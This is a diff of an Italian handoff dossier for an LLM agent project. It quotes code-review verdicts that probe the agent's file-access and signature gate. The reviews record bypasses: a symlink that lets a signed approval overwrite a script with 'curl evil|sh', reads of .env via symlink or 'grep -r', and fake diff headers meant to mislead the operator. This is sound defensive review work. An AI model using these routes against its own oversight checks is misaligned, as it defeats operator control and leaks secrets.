@@ -1,549 +1,326 @@
 # HANDOFF — Dossier di fine sessione
 
-**Sessione:** 2026-10-11 — `.env` caricato da Gas + cancello a 3 livelli (1A) + note basse (PR #180)
+**Sessione:** 2026-10-11 — Gas legge gas.py, brains/, modules/ (scrittura solo con firma) — PR #181
 
 ---
 
 ## §0 DECISIONI UMANE RICHIESTE
 
-1. Merge della PR #180 (https://github.com/Gasss23/Gas/pull/180). Numero e URL dall'output reale dello strumento GitHub collegato (`create_pull_request` → `{"id":"4819380155","url":"https://github.com/Gasss23/Gas/pull/180"}`): `gh` nel container non è autenticato («Failed to log in to github.com using token (GH_TOKEN)»). Tocca la macchina di controllo (gate B, fine-task, revisore.md): il merge lo decide l'operatore.
-2. Fetta di sicurezza (cancello a 3 livelli): secondo passaggio indipendente nella chat claude.ai con l'URL di questo handoff.
-3. Messaggio Telegram del giro notturno: NON arrivato (confermato dall'operatore). Causa più probabile: `.env` non caricato → token assente (risolto in questa PR). Dopo il merge, sul Mac: rifare `python3 gas.py notte` e guardare la riga «Riepilogo Telegram …» a schermo.
-4. Sul Mac: `git pull` e (facoltativo) ricopiare il plist (`reports/setup_notte.md` passo 4).
-5. Decidere se il codice che APPLICA il cancello (`gas.py`, `modules/telegram/bot.py`, `modules/memory/`, `brains/`) e i gate di sviluppo restano al livello 2 (una firma basta per modificarli) o passano al livello 3 (mai) — V-2 bot / V-1 verifica esterna #180.
-6. Limite dichiarato di 1A: decidere se Gas può LEGGERE `gas.py`/`brains/`/`modules/` (oggi vietato), altrimenti il livello 2 serve davvero solo per file piccoli/nuovi, script e config.
+1. Merge della PR #181 (https://github.com/Gasss23/Gas/pull/181). Numero e URL dall'output reale dello strumento GitHub collegato (`create_pull_request` → `{"id":"4819779241","url":"https://github.com/Gasss23/Gas/pull/181"}`): `gh` nel container non è autenticato. Fetta di sicurezza sul cancello: il merge lo decide l'operatore.
+2. Sul Mac: `main` è occupato dal worktree `.claude/worktrees/gate-ip-ottetti` (errore «'main' is already used by worktree»): controllare `git -C .claude/worktrees/gate-ip-ottetti status --short`; se vuoto `git worktree remove .claude/worktrees/gate-ip-ottetti`, poi `git checkout main && git pull`.
+3. Livello 3 per il codice consigliato dal secondo passaggio claude.ai su #180: l'operatore ha deciso livello 2 (con firma); cambia solo se lo dice l'operatore.
+4. Repo GitHub pubblico: se non voluto, renderlo privato (operatore).
 
 ---
 
 ## §1 SCOPE & ESITO FETTE
 
-- **Fetta 1 — Gas carica il `.env` all'avvio**: FATTA (commit `c6a2998`, review #260 APPROVATO CON RISERVE → #261 APPROVATO).
-- **Fetta 2 — schema a 3 livelli del cancello (1A)**: FATTA (commit `3e031f2`, review #262 BOCCIATO → #263 APPROVATO CON RISERVE).
-- **Fetta 3 — note basse (V-1/V-2/V-3 #179, F-verdetto-ritoccato, note bot #177, R-263-1)**: FATTA (commit `0480996`, review #264 BOCCIATO → #265 APPROVATO).
-- **Fetta 4 — finding di verifica-bot #180 (failure, MEDIA) e verifica esterna #180 (APPROVATO CON RISERVE, commento https://github.com/Gasss23/Gas/pull/180#issuecomment-6109591609)**: FATTA (commit `4ad0d46`, review #266 APPROVATO). Test dotenv in CI (bot V-1), hard link negati (verifica esterna V-4), caratteri invisibili (V-2), docstring (bot V-3), limite «codice del cancello = livello 2» dichiarato (bot V-2 / verifica esterna V-1). Non fatti: V-3 verifica esterna (processo, già dichiarato in §4b/§7), V-5 (cosmetica: `Esito:gas.py:5` non più catturato).
-- **Fetta 5 — messaggio Telegram non arrivato + V-6 della seconda verifica esterna #180 (commento https://github.com/Gasss23/Gas/pull/180#issuecomment-6109707394)**: FATTA (commit `19b1a53`, review #267 APPROVATO CON RISERVE → #268 APPROVATO). Il giro notturno scrive a schermo/`launchd.log` se il riepilogo Telegram è partito e, se no, perché; un nome di file con a-capo non può più falsare il messaggio di firma.
-- **E2E con Telegram reale**: SALTATA — nessun token/chiave nel container.
+- **Merge della PR #180**: FATTA su richiesta esplicita dell'operatore nella sessione («Merja PR 180»), con CI verde sull'head `e627769` (unit-suite success, handoff-check success, verifica-bot neutral) e `mergeable_state: clean`. Merge commit `6e93b10`.
+- **Fetta — Gas legge il codice, scrittura solo con firma** (decisione operatore: «Gas può leggere i file ma non toccarli … modificarli solo … con la mia approvazione … deve creare una copia»): FATTA. Commit `2e3e110`. Review #269 APPROVATO CON RISERVE → #270 BOCCIATO → #271 BOCCIATO → #272 BOCCIATO → #273 APPROVATO CON RISERVE.
+- **Note basse del secondo passaggio claude.ai su #180**: DEFERITE (una PR per scopo), tracciate in `reports/stato_progetto.md`.
 
 ---
 
 ## §2 GIT DIFF --STAT (sessione)
 
 ```
- .claude/agents/memoria_revisore.md |  13 +++++++++
- .claude/agents/revisore.md         |   3 +-
- .claude/commands/fine-task.md      |   2 ++
- .github/workflows/ci.yml           |  15 ++++++++++
- .gitignore                         |   1 +
- gas.py                             | 256 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++------
- modules/gate/gate.py               |  79 +++++++++++++++++++++++++++++++++++++++++++++++++---
- modules/notte/notte.py             |  23 +++++++++++++--
- modules/telegram/bot.py            |  67 ++++++++++++++++++++++++++++++++++++++++++++
- reports/design_cancello.md         |  43 ++++++++++++++++++++++++++++
- reports/diff_sessione.md           |  29 +++++++++++++++----
- reports/handoff.md                 | 548 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++---------------------------------------------
- reports/setup_notte.md             |   7 +++++
- reports/stato_progetto.md          |  18 ++++++++----
- reports/ultimo_report.md           |  32 +++++++++++++--------
- scripts/check_verdetto.py          |   6 +++-
- scripts/notte/com.gas.notte.plist  |   6 ++--
- tests/conftest.py                  |   5 ++++
- tests/test_unit_dotenv.py          | 124 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
- tests/test_unit_gate.py            |  99 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++--------
- tests/test_unit_handoff_check.py   |  23 +++++++++++++++
- tests/test_unit_kernel.py          | 274 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++------
- tests/test_unit_notte.py           |  41 +++++++++++++++++++++++++--
- 23 files changed, 1582 insertions(+), 132 deletions(-)
+ .claude/agents/memoria_revisore.md |   9 ++++++
+ gas.py                             | 163 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++--
+ modules/gate/gate.py               |  38 ++++++++++++++++++-----
+ reports/design_cancello.md         |  18 ++++++-----
+ reports/diff_sessione.md           |  28 +++++------------
+ reports/handoff.md                 | 589 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ reports/stato_progetto.md          |  11 +++++--
+ reports/ultimo_report.md           |  31 ++++++++-----------
+ tests/test_unit_gate.py            |  42 ++++++++++++++++++--------
+ tests/test_unit_kernel.py          | 116 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ 10 files changed, 561 insertions(+), 484 deletions(-)
 ```
 
 ## §3 GIT LOG --ONELINE (sessione)
 
 ```
-19b1a53 fix(pr180): esito del riepilogo Telegram a schermo; nomi con a-capo nella firma
-af95f6b chore(revisore): memoria review #268 — APPROVATO
-4dcc40d chore(revisore): memoria review #267 — APPROVATO CON RISERVE
-55a341d docs(fine-task): handoff PR #180 aggiornato (fetta 4: finding bot e verifica esterna, review #266)
-4ad0d46 fix(pr180): test dotenv in CI, hard link negati, limiti del cancello dichiarati
-e74e2fe chore(revisore): memoria review #266 — APPROVATO
-0f97ba7 docs(fine-task): report, stato e handoff PR #180 (.env, cancello a 3 livelli, note basse)
-0480996 fix(note-basse): gate B e percorsi Windows, regola verdetti, note bot #177
-31517ed chore(revisore): memoria review #265 — APPROVATO
-755c5a1 chore(revisore): memoria review #264 — BOCCIATO
-3e031f2 feat(cancello): schema a 3 livelli di write_file (decisione operatore 1A)
-1ee779b chore(revisore): memoria review #263 — APPROVATO CON RISERVE
-477ff0c chore(revisore): memoria review #262 — BOCCIATO
-c6a2998 feat(avvio): Gas carica da sé il .env all'avvio (giro notturno, tetto di spesa)
-5764c4e chore(revisore): memoria review #261 — APPROVATO
-faf1d1e chore(revisore): memoria review #260 — APPROVATO CON RISERVE
+2e3e110 feat(cancello): Gas legge gas.py, brains/, modules/ (scrittura solo con firma)
+8ee8d6a chore(revisore): memoria review #273 — APPROVATO CON RISERVE
+95b6b63 chore(revisore): memoria review #272 — BOCCIATO
+5dc9779 chore(revisore): memoria review #271 — BOCCIATO
+bb981ed chore(revisore): memoria review #270 — BOCCIATO
+4f71953 chore(revisore): memoria review #269 — APPROVATO CON RISERVE
+bd75789 chore(revisore): memoria review #269 — APPROVATO CON RISERVE
 ```
 
 NB: il commit di fine-task che contiene questo file non compare in questo log, per costruzione. Il suo hash è stampato al passo 5.
 
 ## §4 VERDETTO DEL REVISORE (per commit motore)
 
-Nove verdetti, incollati integralmente nell'ordine (#264 e #265 nella versione RIEMESSA dal revisore, originali in §4b). Unica trasformazione: nelle notifiche di #263, #265, #266 e #268 i caratteri `<` e `>` erano arrivati come entità HTML (`&lt;`, `&gt;`) e qui sono riportati come caratteri.
+Cinque verdetti, incollati integralmente nell'ordine. Unica trasformazione: nelle notifiche i caratteri `<`, `>` e `&` arrivano come entità HTML e qui sono riportati come caratteri.
 
-### Review #260 (fetta 1, commit `c6a2998`)
+### Review #269
 
 ## VERDETTO: APPROVATO CON RISERVE
 
-Review #260 del diff staged sul branch feat/merge-automatico-z1xjx2. Prima della review ho letto CLAUDE.md (sezioni 5, 8 e 9), le voci di reports/stato_progetto.md che parlano di `.env` (righe 166, 168 e 475) e la mia memoria. Ho eseguito di persona i test dei file dotenv e notte (64 passed) e un controllo sul parser con i formati di `.env` più a rischio.
+**In breve.** Questo diff non rende leggibile nessun file del livello 3 (i file che Gas non deve mai toccare: segreti, git, .claude, memoria, venv). Ho confrontato il cancello vecchio con quello nuovo su 25 comandi avversari: nessun diniego è andato perso. Il nuovo controllo di read_file sul percorso risolto funziona, e se lo spengo due test falliscono. Resta però un buco **già presente prima** di questo diff, che ho riprodotto: `run_command` riesce comunque a leggere `.env` per due strade indirette. La documentazione nuova invece dice che non può.
 
 **Elementi del diff esaminati**
 
-- `gas.py:462` — `_carica_dotenv` legge il file, salta commenti e righe vuote, gestisce `export` e le virgolette. Non espande `$VAR`. Ho controllato l'eccezione su un file illeggibile, le righe malformate e la chiave con trattino. Esito: ok. Un'eccezione generica viene intercettata e il warning riporta solo il tipo dell'errore (`gas.py:482`). Il messaggio per una riga scartata contiene il numero di riga e, al massimo, il nome della chiave (`gas.py:500`), mai il valore. Il test `tests/test_unit_dotenv.py:55` lo verifica su `segreto-aperto`.
-- `gas.py:504` — c'è la condizione `if chiave in os.environ: continue`. Rischio esaminato: una variabile esportata vuota viene sovrascritta dal file? Esito: ok. Il controllo guarda se la chiave esiste, non se ha un valore, quindi shell, plist e systemd vincono sempre sul file. Il test `tests/test_unit_dotenv.py:47` copre anche il caso della variabile vuota.
-- `gas.py:3679` — la chiamata sta come prima istruzione di `main()`, quindi vale per doctor, notte e telegram. Rischio esaminato: un test che chiama `main()` potrebbe caricare le chiavi reali dell'operatore. Esito: ok. Il flag di spegnimento è impostato in `tests/conftest.py:11` per tutta la suite pytest, e in `tests/test_unit_kernel.py:27`. Il file del kernel lo imposta prima della riga che chiama `main()` (`tests/test_unit_kernel.py:4314`, comando `lezioni`). La fixture di `tests/test_unit_dotenv.py:15` lavora su una copia usa e getta dell'ambiente, quindi la suite resta isolata.
-- `scripts/notte/com.gas.notte.plist:15` — il `source ./.env` con `set -a` è stato tolto e il venv viene cercato prima in `.venv`, poi in `venv`. Rischio esaminato: la catena si ferma se un venv manca. Esito: ok. Con `[ -f ] && source && break` più `; true` finale si va comunque a `python3 gas.py notte`. È anche un miglioramento di sicurezza: il `.env` non viene più eseguito come codice di shell, e se manca la catena non si blocca più.
-- Contesto: `gas.py:1389` (`_sanitized_subprocess_env`). Toglie ai processi lanciati da `run_command` le variabili il cui nome contiene KEY, TOKEN, SECRET e simili. Rispetto a prima non c'è nessuna esposizione nuova: le stesse variabili arrivavano già da `~/.zshrc` o dal `source` del plist. `TELEGRAM_ALLOWED_IDS` non contiene nessuna di quelle parole e passa ai processi figli, ma era così anche prima e non è un segreto.
+- `modules/gate/gate.py:246` — `_LETTURA_NEGATA = _LIVELLO3_PREFISSI`. Rischio: che la lista nuova abbia perso qualche voce oltre a gas.py, brains e modules. Ho confrontato elemento per elemento con `_DENY_PREFIXES` (`modules/gate/gate.py:80`): la differenza è esattamente `gas.py`, `brains`, `modules`. Esito: **ok**.
+- `modules/gate/gate.py:370` e `modules/gate/gate.py:376` — controllo dei token e della sottostringa in run_command. Rischio: forme che sfuggono al controllo. Ho caricato il gate vecchio (HEAD) e il nuovo affiancati e provato:
+  - flag con `=` e attaccati: `cat --file=.env`, `grep -f.ENV x`;
+  - percorsi relativi: `cat ./.env`, `cat a/../.env`, `cat modules/../.env`;
+  - caratteri a larghezza piena, normalizzati con NFKC: `．env`, `.ＥＮＶ`, `ｖｅｎｖ/x`;
+  - virgolette e maiuscole: `'.e''nv'`, `.GIT/config`, `.Claude/x`, `GATE_CONFIG.yaml`;
+  - stato e memoria: `.gas_notte/lock`, `.gas_history.json`.
 
-**Riserve (non bloccanti, da tracciare in stato_progetto.md)**
+  Tutti DENY prima e dopo. Cambiano solo le forme che toccano gas.py/brains/modules. Due di queste, `grep -r KEY modules/..` e `diff -r modules .`, ora passano come IRREVERSIBLE (cioè con approvazione umana). Equivalgono però a `grep -r KEY .`, che era già IRREVERSIBLE prima: nessuna capacità nuova. Esito: **ok**.
+- `modules/gate/gate.py:249` — `lettura_consentita`. Rischio: eccezioni o input degeneri. Per `None`, stringa vuota, spazi, percorso assoluto e `../x` restituisce False, mai un'eccezione. Esito: **ok**.
+- `gas.py:2671` — read_file ricontrolla `lettura_consentita` sul percorso risolto (`_file_rel_root`, `gas.py:1582`). Rischio: un symlink con nome innocuo che porta a `.env`. Ho fatto una mutation: con il controllo spento (`if False and ...`) T83c e T83d falliscono (748 PASS / 2 FAIL) e T83d stampa `SEGRETO=xyz`. Con il controllo attivo l'accesso è negato. Esito: **ok**.
+- `gas.py:2698` — il limite di 8000 caratteri (`_cap_tool_output`) vale anche per la lettura del codice. gas.py viene troncato, e il modello può sfogliarlo a pezzi con head/tail/grep -n. Esito: **ok**.
+- Finestra contaminata: read_file e run_command sono già tra gli input non fidati (`modules/gate/gate.py:74`). Dopo aver letto il codice, ogni azione UNCERTAIN va all'approvazione. È più attrito, non meno sicurezza. Esito: **ok**.
+- `tests/test_unit_kernel.py:7571` — T83 fa un giro completo: legge davvero il codice, la modifica successiva va alla firma e il file resta intatto, `.env` e il symlink sono negati. Esito: **ok**.
+- Scrittura: `livello_scrittura` è invariato e il cancello (`modules/gate/`) resta al livello 3. Il livello 2 resta con firma più snapshot preventivo, cioè la «copia» chiesta dall'operatore. Esito: **ok**.
 
-- **R-260-1 (BASSA)** — Una riga come `KEY="v" # commento` viene scartata con il messaggio «virgolette non chiuse», che è fuorviante. L'ho riprodotto nel controllo: `Z_Q` non viene caricata. Il `source` di zsh, usato finora dal plist, quella riga la accettava. Quindi un `.env` che funzionava col plist vecchio può perdere una variabile, con un solo warning nel log. Correzione: accettare una chiusura di virgolette seguita da spazi e `#`, oppure almeno cambiare il messaggio.
-- **R-260-2 (BASSA)** — Se il file inizia con un BOM UTF-8 (un carattere invisibile che alcuni editor aggiungono all'inizio del file), la prima riga viene scartata (riprodotto con `Z_BOM`). Correzione: leggere con `encoding="utf-8-sig"`.
-- **R-260-3 (BASSA, documentazione)** — Sul VPS, `gas.py telegram` passa ora dal caricamento del `.env`. Se accanto a gas.py c'è un `.env` vecchio, quel file riempie le variabili che mancano in `.env.prod`. systemd continua a vincere sulle variabili che definisce, ma un file finora ignorato diventa attivo. Va scritto in setup o in stato_progetto.
+**Riserve (da tracciare in reports/stato_progetto.md)**
 
-**Rischi esclusi (non verificati)**
+- **R-269-1 (MEDIA, preesistente, riprodotta su un kernel reale).** `run_command` legge comunque il livello 3 per due vie indirette:
+  1. Symlink: `cat innocuo.txt`, dove `innocuo.txt` punta a `.env`, restituisce `SEGRETO=xyz`.
+  2. Ricorsione: `grep -r SEGRETO .` restituisce `./.env:SEGRETO=xyz`.
 
-- Il comportamento reale sotto launchd sul Mac: non è riproducibile qui su Linux, dove non ci sono launchd, zsh di sistema né `.venv` dell'operatore.
-- Non sappiamo se sul VPS esista oggi un `.env` accanto a `.env.prod`: non ho accesso al server.
-- Non ho rieseguito tutta la suite (874 passed, kernel 715/0): quei numeri sono dichiarati dall'agente, io ho riprodotto solo i 64 test di dotenv e notte.
+  Il cancello controlla solo i nomi dei token. `_vet_command` (`gas.py:1441`) controlla solo che il percorso resti dentro la root, e il ricontrollo sul percorso risolto esiste solo per read_file. Entrambi i comandi sono IRREVERSIBLE, quindi serve l'approvazione. Con `GAS_SANDBOX_MODE=os_strict` impostata esplicitamente diventano UNCERTAIN e, a finestra pulita, partono senza approvazione: il contenuto di `.env` finisce al provider LLM.
 
-La riga #260 e una lezione nuova sono in `/home/user/Gas/.claude/agents/memoria_revisore.md`. Le ho committate da sole (commit faf1d1e) e il diff staged è rimasto intatto (6 file).
+  Non è una regressione di questo diff, ma `reports/design_cancello.md:352` e il test `tests/test_unit_gate.py:510` affermano «illeggibili anche con run_command». Le soluzioni possibili:
+  - correggere la frase del documento;
+  - negare `-r`/`-R`/`--recursive` quando un argomento è una cartella antenata del livello 3;
+  - risolvere i symlink degli argomenti in `_vet_command` e applicarci `lettura_consentita`.
+- **R-269-2 (BASSA).** read_file non controlla `st_nlink`: un hard link già presente verso `.env` si legge. Il modello non può crearlo (né write_file né l'allowlist lo permettono), quindi serve un link preesistente. In scrittura il caso è già chiuso (#266).
+- **R-269-3 (BASSA, solo test).** `tests/test_unit_gate.py:526` usa `sed -n 1,50p gas.py`, ma `sed` non è nell'allowlist di esecuzione (`gas.py:1387`). Il test prova solo il gate, non un comando che girerebbe davvero: meglio `head -n 50 gas.py`.
+- **Nota, non è una riserva.** Ora anche il codice del cancello (`modules/gate/gate.py`) è leggibile, quindi il modello può studiarne le regole. È coerente con la decisione dell'operatore («modules/» compreso). La difesa resta che le regole siano corrette, non che siano segrete.
 
-### Review #261 (fetta 1, ri-review, commit `c6a2998`)
+**Cosa NON ho verificato e perché**
 
-## VERDETTO: APPROVATO
+- Il giro notturno reale (launchd sul Mac, systemd sul VPS) con lettura del codice: non riproducibile qui. Ho controllato solo che non ci siano impostazioni `GAS_SANDBOX_MODE` in `scripts/` e `modules/notte/`.
+- Il comportamento su filesystem macOS che non distinguono maiuscole/minuscole: ragionato (la normalizzazione porta tutto in minuscolo), non provato.
+- Lo spazio di larghezza zero (`.e​nv`) non è un bypass reale: il file `.env` non ha quel nome.
 
-Ri-review #261 del diff staged aggiornato: R-260-1 e R-260-2 sono chiuse. Ho rieseguito io stesso pytest completo (875 passed) e `python3 tests/test_unit_kernel.py` (715 PASS, 0 FAIL).
-
-**Elementi del diff esaminati**
-
-- `gas.py:461` — la nuova regex `_DOTENV_VIRGOLETTE` riconosce un valore tra virgolette, anche se seguito da `# commento`, e lo applica all'intera riga (`fullmatch`, `gas.py:500`).
-  - Rischi esaminati: valori scelti in modo sbagliato, rallentamenti patologici, valori finiti nei log.
-  - Prove fatte:
-    - `"a" # c "d"` diventa `a`;
-    - `'w'#attaccato` e `"x" y` vengono scartati con il warning, che riporta solo il nome della chiave;
-    - `""` diventa il valore vuoto;
-    - una riga di 20.000 caratteri senza virgoletta di chiusura viene scartata subito, senza rallentamenti.
-  - Esito: ok.
-  - Unica stranezza: `"a"b"` viene caricato come `a"b`, mentre zsh lo rifiuterebbe. È cosmetica, non serve tracciarla.
-- `gas.py:481` — il file ora si legge con `encoding="utf-8-sig"`.
-  - Rischio esaminato: la prima riga persa se il file inizia con il BOM (il carattere invisibile che alcuni editor mettono in testa).
-  - Esito: ok. Il BOM viene tolto; i file senza BOM si leggono come prima, e un byte non UTF-8 va ancora nel ramo fail-safe (lo copre il test esistente).
-- `tests/test_unit_dotenv.py:47` — il test nuovo copre il BOM, il commento dopo le virgolette (con un `#` anche dentro le virgolette), la riga attaccata `'w'#attaccato` che viene scartata e il caso `"a" # c "d"`.
-  - Esito: ok. Usa la stessa fixture isolata `env`, quindi resta separato dal resto della suite.
-
-**Rischi esclusi (non verificati)**
-
-- Il comportamento sotto launchd sul Mac, per lo stesso motivo della #260: qui non ci sono launchd né il `.env` reale dell'operatore.
-- La compatibilità completa con la sintassi di zsh (escape `\"`, valori su più righe): non è nello scopo di un parser minimale ed è dichiarata nel docstring.
-
-**Da fare per l'agente**
-
-R-260-3 non risulta ancora in `reports/stato_progetto.md` (la ricerca di «R-260-3» non trova nulla). Va aggiunta prima del commit dei report.
-
-La riga #261 è in `/home/user/Gas/.claude/agents/memoria_revisore.md`, committata da sola (commit 5764c4e).
-
-### Review #262 (fetta 2, prima review — BOCCIATO, non committato)
-
-## VERDETTO: BOCCIATO
-
-La fetta è solida in quasi tutto. Il gate non apre niente di nuovo: su 65.640 percorsi provati, nessuno che prima era vietato in scrittura è sceso al livello 1. Resta però un difetto di logica nel meccanismo della firma, e l'ho riprodotto. Il design dichiara «un symlink con nome innocuo verso un file delicato non passa», ma la protezione copre solo il caso della finestra pulita.
-
-**Motivo bloccante**
-
-- `gas.py:2577` — controllo all'esecuzione: con `firmata=True` legge `_base_sha256` dagli argomenti salvati in coda. Rischio esaminato: da dove arriva quella chiave. Solo nel livello 2 la scrive il kernel (`_prepara_firma_codice`). Nel parcheggio normale del livello 1 la può mettere il modello, perché lì nessuno rifiuta le chiavi extra. **Esito: blocco.**
-- `gas.py:1662` — `_parcheggia_e_notifica` decide se una richiesta è di livello 2 con `gate_classify` sul nome scritto dal modello, non sul file vero dietro un eventuale symlink. Rischio: un nome di livello 1 che punta a un file di livello 2. **Esito: blocco**, è il secondo pezzo dello stesso difetto.
-- Come l'ho riprodotto (kernel reale in una cartella temporanea): symlink `nota.md` → `scripts/saluto.sh`.
-  - Il gate sul nome dà `UNCERTAIN`.
-  - Con la finestra contaminata la richiesta va in coda col read-back normale: nome `nota.md`, niente diff, niente pro/contro.
-  - All'approvazione `applica_firma` chiama `execute_tool_call(..., firmata=True)`. Al percorso risolto corrisponde il livello 2, e l'impronta messa dal modello coincide.
-  - Risultato: `Successo`, e `scripts/saluto.sh` viene sovrascritto con `curl evil|sh`.
-  - Variante con symlink pendente verso `brains/nuovo.py` e `_base_sha256: "assente"`: il file viene creato.
-- In pratica la firma data a «nota.md» autorizza la scrittura di un file di codice, senza il diff e senza i pro e contro richiesti dalla decisione 1A. Serve un symlink già presente: Gas da solo non può crearlo, e senza questa modifica le cose andavano peggio. Ma è una garanzia di sicurezza dichiarata e non mantenuta.
-- `tests/test_unit_kernel.py:7448` — T82i prova solo la finestra pulita. **Esito: riserva**, manca proprio il caso che fallisce.
-
-**Correzione minima richiesta (a scelta, meglio entrambe)**
-
-- (a) In `_parcheggia_e_notifica`, per `write_file`, calcolare il livello sul percorso RISOLTO (`_file_rel_root` + `livello_scrittura`): se è 2, passare sempre da `_prepara_firma_codice`.
-- (b) All'esecuzione con `firmata=True` sul livello 2, rifiutare se il livello del nome testuale non è anch'esso 2. In alternativa, togliere/rifiutare `_base_sha256` in ogni parcheggio che non sia di livello 2.
-- Più un test: symlink + finestra contaminata + `_base_sha256` messo dal modello → file NON scritto.
-
-**Riserve (non bloccanti, da tracciare)**
-
-1. **MEDIA** — `modules/telegram/bot.py:143`: pro e contro (testo libero del modello, senza limite di lunghezza) stanno PRIMA del diff vero. Il modello può scriverci una finta intestazione «DIFF REALE (calcolato da Gas…)» con un diff innocuo e spingere quello vero in fondo al messaggio. Da fare: diff in cima, pro/contro dopo, con un tetto di lunghezza e le righe che sembrano intestazioni neutralizzate.
-2. **MEDIA** — `modules/telegram/bot.py:126`: il read-back e l'intestazione del diff (`gas.py:1597`) mostrano `relative_path` testuale. Con `scripts/link` → `brains/x.py` l'operatore firma un nome che non è il file scritto. Anche un nome con a-capo (accettato su Linux) può falsare righe del messaggio. Va mostrato il percorso risolto (`rel_root`), con i caratteri di controllo resi visibili.
-3. **BASSA** — `gas.py:1597`: nel diff i caratteri invisibili restano grezzi.
-   - Riprodotto: un file con BOM e CRLF dà `-\ufeffecho a\r` / `+echo a`, righe che su Telegram sembrano uguali.
-   - Spazi a larghezza zero e controlli bidi (Trojan Source) passerebbero allo stesso modo.
-   - `splitlines` spezza anche su `\u2028`: il marcatore «Senza a-capo finale» compare a metà testo.
-4. **BASSA, da dichiarare** — `read_file` resta vietata su `gas.py`, `brains/` e `modules/` (`_DENY_PREFIXES`). Il modello quindi deve riscrivere il file intero senza averlo letto, e il diff supera i 4096 caratteri: in pratica il livello 2 su quei file serve a poco.
-5. **BASSA, Windows** — `modules/gate/gate.py:238`: `livello_scrittura` passa per `os.path.normpath` e poi spezza con `PurePosixPath`. Su Windows `modules\gate\gate.py` diventa un pezzo solo e scende al livello 2; anche `dati\.env` non viene riconosciuto. In più `write_text` in modo testo cambia gli a-capo rispetto al diff. Va dichiarato che Windows è fuori dal modello di minaccia.
-
-**Elementi verificati come corretti**
-
-- `modules/gate/gate.py:319` — `gate_classify("write_file")`: livello 3 → DENY, 2 → IRREVERSIBLE, 1 → prosegue come prima. Rischio: che qualcosa diventi più libero. Confronto automatico tra il vecchio `_check_path_arg(write=True)` e `livello_scrittura` su 65.640 combinazioni (fullwidth, `gate.`, `modules./gate`, MAIUSCOLE, `..`): 0 casi più permissivi, 152 più severi (solo `.`/`x/..` → 3). **ok**
-- `gas.py:2568` — livello ricalcolato sul percorso risolto. Il livello 3 viene negato anche con firma. Su macOS (file system che non distingue maiuscole) `MODULES/GATE` passa per il casefold e dà comunque 3. **ok**
-- `gas.py:1605` — `_prepara_firma_codice`: rifiuta le chiavi extra, sovrascrive `_base_sha256` col valore calcolato dal kernel prima di accodare (quindi l'impronta è coperta dall'hash della coda e il doppione resta coerente), un file non UTF-8 porta al diniego. Restano corretti anche il tetto delle richieste in attesa e la revoca quando il messaggio è troppo grande. **ok**
-- Giro notturno (`modules/notte/notte.py:92`): non chiama mai `execute_tool_call` con `firmata=True`; un livello 2 notturno finisce in coda e manda la richiesta su Telegram. Nessuna nuova strada per scrivere. **ok**
-- Esiti riprodotti: pytest 942 passed; `tests/test_unit_kernel.py` 735 PASS, 0 FAIL.
-
-**Rischi esclusi esplicitamente**
-
-- Comportamento su Windows non eseguito: niente ambiente, l'ho solo ragionato dal codice.
-- Hard link già presenti verso file di livello 2: non verificati. Gas non può crearli e sono fuori dallo scopo di questa fetta.
-- Gara tra il controllo dell'impronta e la scrittura (un processo concorrente che cambia il file in quella finestra): non provata, la finestra è dell'ordine dei microsecondi.
-- Resa reale del messaggio su Telegram (bidi, `\r`): valutata solo sul testo, non sul client.
-
-Memoria aggiornata con la riga #262 e la lezione, committata come 477ff0c. Lo staging del diff sotto review è intatto.
+**Riprodotto**: pytest 947 passed; kernel 750 PASS, 0 FAIL. Memoria aggiornata con la riga #269 più una lezione, committata da sola (4f71953).
 
 File rilevanti:
-- /home/user/Gas/gas.py
 - /home/user/Gas/modules/gate/gate.py
-- /home/user/Gas/modules/telegram/bot.py
+- /home/user/Gas/gas.py
+- /home/user/Gas/tests/test_unit_gate.py
 - /home/user/Gas/tests/test_unit_kernel.py
 - /home/user/Gas/reports/design_cancello.md
 - /home/user/Gas/.claude/agents/memoria_revisore.md
 
-### Review #263 (fetta 2, ri-review, commit `3e031f2`)
-
-## VERDETTO: APPROVATO CON RISERVE
-
-La ri-review #263 chiude il blocco della #262: ho rilanciato l'attacco col symlink sul codice corretto e ora viene negato. Restano una riserva bassa sui caratteri invisibili e il controllo dei limiti dichiarati.
-
-**Elementi del diff esaminati**
-
-- `gas.py:2620` — all'esecuzione con firma, un file di livello 2 si scrive solo se `_file_reale` coincide col percorso risolto e l'impronta è la stessa.
-  - Rischio esaminato: una firma data a un'altra richiesta che apre la scrittura del codice.
-  - `_file_reale` lo scrive solo `_prepara_firma_codice`. L'unico punto di produzione che mette in coda le richieste è `_parcheggia_e_notifica` (`enqueue_approval` non ha chiamanti fuori dai test).
-  - Una vecchia richiesta di livello 1 ancora in coda, o un symlink cambiato tra la richiesta e la firma, porta al diniego. Anche un `GAS_CWD` diverso tra il kernel che chiede e quello che esegue porta al diniego, se il file risolto non è lo stesso.
-  - Riprodotto: `_file_reale="nota.md"` con firma → «non è quello mostrato».
-  - Mutation (controllo tolto) → T82i fallisce. **ok**
-- `gas.py:1704` — un `write_file` che non è di livello 2 ma contiene `_base_sha256` o `_file_reale` viene negato prima di entrare in coda. Riprodotto: «argomenti riservati al kernel». Mutation (controllo tolto) → T82i fallisce. **ok**
-- `gas.py:1616` e `gas.py:2813` — `_write_livello2` decide sul nome OPPURE sul percorso risolto, e un `UNCERTAIN` che risolve al livello 2 diventa `IRREVERSIBLE`.
-  - Riprodotto: symlink `nota.md` → `scripts/saluto.sh` con la finestra contaminata e l'impronta messa dal modello → «servono pro e contro», nessuna richiesta in coda.
